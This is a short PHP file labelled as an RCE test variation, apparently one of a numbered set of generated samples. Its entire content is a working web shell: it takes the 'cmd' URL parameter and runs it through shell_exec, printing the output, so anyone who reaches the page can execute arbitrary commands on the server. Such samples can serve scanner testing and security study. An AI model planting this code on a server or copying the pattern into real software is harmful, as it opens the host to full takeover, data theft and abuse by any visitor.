<?php
// RCE test variation #965
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>